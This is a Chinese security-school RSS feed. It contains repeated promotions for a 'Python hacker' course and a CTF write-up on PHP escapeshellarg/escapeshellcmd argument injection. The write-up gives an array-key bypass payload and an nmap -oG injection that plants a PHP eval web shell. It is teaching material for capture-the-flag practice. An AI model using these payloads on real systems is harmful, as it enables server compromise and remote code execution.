<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>二向箔安全学院</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>前沿、专业的网络空间攻防实训 专注于提供最前沿的网络空间安全攻防人才培养的解决方案。twosecurity.cn</description>
<language>zh-cn</language>
<lastBuildDate>Thu, 23 Jan 2020 11:27:34 +0800</lastBuildDate>
<item>
<title>python程序员也能当黑客</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-22-103476392.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103476392&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5a75a57e3f930e85d4f6000036ff1208_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;又是一年新春佳节，怕新年的鞭炮声太大，大家听不见我的祝福，让我赶在最最最前面给亲爱的大家说一声“新年快乐~”，新的一年请让二向箔带着满满的诚意继续宠爱你。&lt;b&gt;本期只谈福利，不打广告。&lt;/b&gt;带着用小编年终奖换来的“免费”课程，各位一定要好好享用哦。&lt;/p&gt;&lt;h2&gt;Python黑客|暗夜契约&lt;/h2&gt;&lt;p&gt;来了，来了，带着它中二的名字，它又来了。全新技能包终于赶在年前定档上线啦，力求在春节档求得一席之地。&lt;/p&gt;&lt;p&gt;知道各位春节一定非常闲，我这就替大家安排上了！春节来二向箔学习 python 黑客技能包，开发专属于自己的安全工具。并学习一下 python 攻击注入姿势，新年当然要从新姿势开始。&lt;/p&gt;&lt;p&gt;Python 程序员们，成为 &lt;b&gt;程序员x黑客&lt;/b&gt; &lt;b&gt;PLUS &lt;/b&gt;的大好机会，千万不容错过。&lt;/p&gt;&lt;h2&gt;目录&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;课程前言、安装python&lt;/li&gt;&lt;li&gt;CRLF 注入&lt;/li&gt;&lt;li&gt;ZIP 密码爆破&lt;/li&gt;&lt;li&gt;Flask 模板注入&lt;/li&gt;&lt;li&gt;流量分析&lt;/li&gt;&lt;li&gt;扫描 banner 信息&lt;/li&gt;&lt;li&gt;子域名枚举&lt;/li&gt;&lt;li&gt;ftp 口令枚举&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;春节限定&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot;/&gt;&lt;figcaption&gt;点击放大后扫码领取&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;技能包共计 8 个课时，依旧是 &lt;b&gt;学-练-测&lt;/b&gt; 三维一体的教学模式。与前几个技能包不同的是，新技能有老师视频教学，且单节视频长度平均在二十分钟左右，真·手把手教你开发工具哦。&lt;/p&gt;&lt;p&gt;技能包售价&lt;b&gt;￥66元&lt;/b&gt;，春节期间限定 &lt;b&gt;免费开放&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;&lt;b&gt;活动时间：2020年1月19日-2020年1月31日&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;公众号 &lt;/b&gt;&lt;u&gt;二向箔安全&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;详情咨询微信号：twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;活动结束后价格恢复原价。&lt;/blockquote&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-22-103476392</guid>
<pubDate>Wed, 22 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>python程序员也能当黑客</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-21-103476392.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103476392&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5a75a57e3f930e85d4f6000036ff1208_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;又是一年新春佳节，怕新年的鞭炮声太大，大家听不见我的祝福，让我赶在最最最前面给亲爱的大家说一声“新年快乐~”，新的一年请让二向箔带着满满的诚意继续宠爱你。&lt;b&gt;本期只谈福利，不打广告。&lt;/b&gt;带着用小编年终奖换来的“免费”课程，各位一定要好好享用哦。&lt;/p&gt;&lt;h2&gt;Python黑客|暗夜契约&lt;/h2&gt;&lt;p&gt;来了，来了，带着它中二的名字，它又来了。全新技能包终于赶在年前定档上线啦，力求在春节档求得一席之地。&lt;/p&gt;&lt;p&gt;知道各位春节一定非常闲，我这就替大家安排上了！春节来二向箔学习 python 黑客技能包，开发专属于自己的安全工具。并学习一下 python 攻击注入姿势，新年当然要从新姿势开始。&lt;/p&gt;&lt;p&gt;Python 程序员们，成为 &lt;b&gt;程序员x黑客&lt;/b&gt; &lt;b&gt;PLUS &lt;/b&gt;的大好机会，千万不容错过。&lt;/p&gt;&lt;h2&gt;目录&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;课程前言、安装python&lt;/li&gt;&lt;li&gt;CRLF 注入&lt;/li&gt;&lt;li&gt;ZIP 密码爆破&lt;/li&gt;&lt;li&gt;Flask 模板注入&lt;/li&gt;&lt;li&gt;流量分析&lt;/li&gt;&lt;li&gt;扫描 banner 信息&lt;/li&gt;&lt;li&gt;子域名枚举&lt;/li&gt;&lt;li&gt;ftp 口令枚举&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;春节限定&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;技能包共计 8 个课时，依旧是 &lt;b&gt;学-练-测&lt;/b&gt; 三维一体的教学模式。与前几个技能包不同的是，新技能有老师视频教学，且单节视频长度平均在二十分钟左右，真·手把手教你开发工具哦。&lt;/p&gt;&lt;p&gt;技能包售价&lt;b&gt;￥66元&lt;/b&gt;，春节期间限定 &lt;b&gt;免费开放&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;&lt;b&gt;活动时间：2020年1月19日-2020年1月31日&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;公众号 &lt;/b&gt;&lt;u&gt;二向箔安全&lt;/u&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;详情咨询微信号：twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;活动结束后价格恢复原价。&lt;/blockquote&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-21-103476392</guid>
<pubDate>Tue, 21 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>CTF|PHP中的命令参数注入</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-20-103535020.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103535020&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f5a67a5940ae10db7b96646c354ca864_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;直奔主题，首先来了解两个 PHP 函数的定义。&lt;/p&gt;&lt;h2&gt;命令参数注入&lt;/h2&gt;&lt;p&gt;&lt;b&gt;escapeshellarg&lt;/b&gt;&lt;/p&gt;&lt;p&gt;把字符串转码为可以在 shell 命令里使用的参数。&lt;/p&gt;&lt;p&gt;&lt;b&gt;escapeshellcmd&lt;/b&gt;&lt;/p&gt;&lt;p&gt;对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。&lt;/p&gt;&lt;p&gt;看上去似乎没什么毛病，escapeshellarg 与 escapeshellcmd 两个函数都是 php 设置来转义非法字符的，不过由于它们俩的转义规则有所不同，当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。这是为什么呢？&lt;/p&gt;&lt;h2&gt;原理解析&lt;/h2&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;969&quot; data-rawheight=&quot;322&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;969&quot; data-original=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;969&quot; data-rawheight=&quot;322&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;969&quot; data-original=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;test.php&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;969&quot; data-rawheight=&quot;316&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;969&quot; data-original=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;969&quot; data-rawheight=&quot;316&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;969&quot; data-original=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;执行的语句将变成&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;curl &amp;#39;127.0.0.1&amp;#39;\\&amp;#39;&amp;#39; -v -d a=1\&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;相当于&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;curl 127.0.0.1\ -v -d a=1&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从而实现参数注入&lt;/p&gt;&lt;h2&gt;题目分析&lt;/h2&gt;&lt;p&gt;下面就以几道 CTF 题作为补充的讲解。&lt;/p&gt;&lt;p&gt;&lt;b&gt;题目1：[0 =&amp;gt; 0] === [0x100000000 =&amp;gt; 0]&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php
$user = [&amp;#39;admin&amp;#39;, &amp;#39;xxoo&amp;#39;];
if(empty($_GET[&amp;#39;user&amp;#39;]))  die(show_souce(__FILE__));
if($_GET[&amp;#39;user&amp;#39;] === $user &amp;amp;&amp;amp; $_GET[&amp;#39;user&amp;#39;][0] != &amp;#39;admin&amp;#39;){
    echo $flag;
} else {
    die(&amp;#39;sketch_pl4ne_wants_a_girlfriend.&amp;#39;);
}
?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;分析&lt;/b&gt;&lt;/p&gt;&lt;p&gt;这个实际上考的是索引数组的整数键截断&lt;/p&gt;&lt;p&gt;也就是：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//bugs.php.net/bug.php%3Fid%3D69892&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;bugs.php.net/bug.php?&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;id=69892&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1024&quot; data-rawheight=&quot;447&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1024&quot; data-original=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1024&quot; data-rawheight=&quot;447&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1024&quot; data-original=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;var_dump([0 =&amp;gt; 0] === [0x100000000 =&amp;gt; 0]); // bool(true)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;构造 payload&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;?user[4294967296]=admin&amp;amp;user[1]=xxoo
//0x100000000 == 4294967296&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;该漏洞仅在 64 位的 php 中有效&lt;br/&gt;如何判断 32 位还是 64 位？&lt;br/&gt;查看 phpinfo() 即可知道。&lt;/blockquote&gt;&lt;p&gt;&lt;b&gt;题目2：BUUCTF_2018_Online Tool&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?php

if (isset($_SERVER[&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;])) {
    $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] = $_SERVER[&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;];
}

if(!isset($_GET[&amp;#39;host&amp;#39;])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET[&amp;#39;host&amp;#39;];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5(&amp;#34;glzjin&amp;#34;. $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;]);
    echo &amp;#39;you are in sandbox &amp;#39;.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system(&amp;#34;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;#34;.$host);
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;分析&lt;/b&gt;&lt;/p&gt;&lt;p&gt;直接代码审计吧，remote_addr 和 x_forwarded_for 这两个是服务器获取 ip 用的。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;$host = escapeshellarg($host);
$host = escapeshellcmd($host);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前面说了，这两个 PHP 函数一起使用，会导致漏洞。&lt;/p&gt;&lt;p&gt;再后面 echo system(&amp;#34;nmap -T5 -sT -Pn --host-timeout 2 -F &amp;#34;.$host);&lt;/p&gt;&lt;p&gt;有个 system 来执行命令，而且有传参，这里应该就是突破口了。&lt;/p&gt;&lt;p&gt;nmap 可以做些什么呢？查阅相关资料后，发现一个 namp 参数 -oG 可以实现将命令和结果写到文件。&lt;/p&gt;&lt;p&gt;so，写入上传文件，直接一句话走起吧。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;?host=&amp;#39; &amp;lt;?php @eval($_POST[&amp;#34;hack&amp;#34;]);?&amp;gt; -oG hack.php &amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后会返回文件夹名&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2872&quot; data-rawheight=&quot;112&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2872&quot; data-original=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2872&quot; data-rawheight=&quot;112&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2872&quot; data-original=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;连接一句话即可得到 flag。&lt;/p&gt;&lt;blockquote&gt;参考：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//bugs.php.net/bug.php%3Fid%3D69892&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;bugs.php.net/bug.php?&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;id=69892&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.php.net/manual/zh/function.escapeshellcmd.php&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;php.net/manual/zh/funct&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ion.escapeshellcmd.php&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包又更新了！学 Python 的也能当黑客了，多实战沉浸式体验，让你回味无穷。&lt;/p&gt;&lt;p&gt;这个春节，让你从 &lt;b&gt;程序猿→黑客x程序员 PLUS&lt;/b&gt;！&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-20-103535020</guid>
<pubDate>Mon, 20 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>python程序员也能当黑客</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-19-103476392.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103476392&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5a75a57e3f930e85d4f6000036ff1208_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;又是一年新春佳节，怕新年的鞭炮声太大，大家听不见我的祝福，让我赶在最最最前面给亲爱的大家说一声“新年快乐~”，新的一年请让二向箔带着满满的诚意继续宠爱你。&lt;b&gt;本期只谈福利，不打广告。&lt;/b&gt;带着用小编年终奖换来的“免费”课程，各位一定要好好享用哦。&lt;/p&gt;&lt;h2&gt;Python黑客|暗夜契约&lt;/h2&gt;&lt;p&gt;来了，来了，带着它中二的名字，它又来了。全新技能包终于赶在年前定档上线啦，力求在春节档求得一席之地。&lt;/p&gt;&lt;p&gt;知道各位春节一定非常闲，我这就替大家安排上了！春节来二向箔学习 python 黑客技能包，开发专属于自己的安全工具。并学习一下 python 攻击注入姿势，新年当然要从新姿势开始。&lt;/p&gt;&lt;p&gt;Python 程序员们，成为 &lt;b&gt;程序员x黑客&lt;/b&gt; &lt;b&gt;PLUS &lt;/b&gt;的大好机会，千万不容错过。&lt;/p&gt;&lt;h2&gt;目录&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;课程前言、安装python&lt;/li&gt;&lt;li&gt;CRLF 注入&lt;/li&gt;&lt;li&gt;ZIP 密码爆破&lt;/li&gt;&lt;li&gt;Flask 模板注入&lt;/li&gt;&lt;li&gt;流量分析&lt;/li&gt;&lt;li&gt;扫描 banner 信息&lt;/li&gt;&lt;li&gt;子域名枚举&lt;/li&gt;&lt;li&gt;ftp 口令枚举&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;春节限定&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;技能包共计 8 个课时，依旧是 &lt;b&gt;学-练-测&lt;/b&gt; 三维一体的教学模式。与前几个技能包不同的是，新技能有老师视频教学，且单节视频长度平均在二十分钟左右，真·手把手教你开发工具哦。&lt;/p&gt;&lt;p&gt;技能包售价&lt;b&gt;￥66元&lt;/b&gt;，春节期间限定 &lt;b&gt;免费开放&lt;/b&gt;。&lt;/p&gt;&lt;p&gt;在&lt;b&gt;二向箔安全公众号&lt;/b&gt;回复“&lt;b&gt;暗夜契约&lt;/b&gt;”关键字参与活动邀请三位好友即可免费获取，成功获取后课程一年内有效，不受活动时间限制。&lt;/p&gt;&lt;p&gt;&lt;b&gt;活动时间：2020年1月19日-2020年1月31日&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;详情咨询微信号：twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;活动结束后价格恢复原价。&lt;/blockquote&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-19-103476392</guid>
<pubDate>Sun, 19 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>多级代理：Stowaway</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-19-103463024.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103463024&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
